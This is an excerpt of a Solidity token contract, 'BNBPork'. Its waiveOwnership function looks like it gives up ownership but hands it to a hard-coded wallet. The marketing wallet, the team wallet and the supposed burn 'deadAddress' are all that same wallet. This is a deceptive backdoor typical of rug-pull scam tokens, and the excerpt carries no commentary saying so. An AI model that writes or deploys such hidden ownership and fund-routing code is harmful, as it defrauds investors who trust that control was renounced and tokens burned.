...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xD342847aF482Df2815b70583c7c9b53018c09F65));
        _owner = address(0xD342847aF482Df2815b70583c7c9b53018c09F65);
    }
...
contract BNBPork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BNBPork";
    string private _symbol = "BNBPork";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xD342847aF482Df2815b70583c7c9b53018c09F65);
    address payable public teamWalletAddress = payable(0xD342847aF482Df2815b70583c7c9b53018c09F65);
    address public immutable deadAddress = 0xD342847aF482Df2815b70583c7c9b53018c09F65;
